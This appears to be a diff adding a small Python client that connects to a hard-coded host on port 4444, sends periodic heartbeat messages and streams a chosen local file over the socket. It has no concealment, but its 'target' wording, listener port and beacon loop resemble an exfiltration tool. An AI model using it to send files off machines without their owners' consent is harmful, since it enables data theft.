@@ -1,0 +1,67 @@
+import socket
+import os
+import threading
+import time
+
+# Target IP and port
+TARGET_IP = '192.168.100.2'
+TARGET_PORT = 4444
+HEARTBEAT_INTERVAL = 10  # Heartbeat interval in seconds
+FILE_PATH = 'C:\\path\\to\\the\\document.pdf'  # Replace with the path to the file you want to send
+#works with txt, docx, pdf files
+#However, docx and pdf files need to be parsed
+
+def create_connection():
+    """Establish a connection to the target."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((TARGET_IP, TARGET_PORT))
+    print(f"[*] Connected to {TARGET_IP}:{TARGET_PORT}")
+    return sock
+
+def send_heartbeat(sock):
+    """Send heartbeat messages to keep the connection alive."""
+    while True:
+        try:
+            time.sleep(HEARTBEAT_INTERVAL)
+            sock.sendall(b"HEARTBEAT\n")
+            print("[*] Heartbeat sent.")
+        except Exception as e:
+            print(f"[-] Heartbeat failed: {e}")
+            break
+
+def send_file(sock, file_path):
+    """Send a file via the established connection."""
+    try:
+        with open(file_path, 'rb') as file:
+            while True:
+                data = file.read(1024)
+                if not data:
+                    break
+                sock.sendall(data)
+            print(f"[*] File {file_path} sent successfully.")
+    except Exception as e:
+        print(f"[-] Failed to send file: {e}")
+
+def main():
+    sock = create_connection()
+
+    # Start the heartbeat thread
+    heartbeat_thread = threading.Thread(target=send_heartbeat, args=(sock,), daemon=True)
+    heartbeat_thread.start()
+
+    # Send the file
+    send_file(sock, FILE_PATH)
+
+    # Keep the connection open
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("[*] Exiting. Goodbye!")
+    finally:
+        # Close the connection
+        sock.close()
+        print("[*] Connection closed.")
+
+if __name__ == "__main__":
+    main()
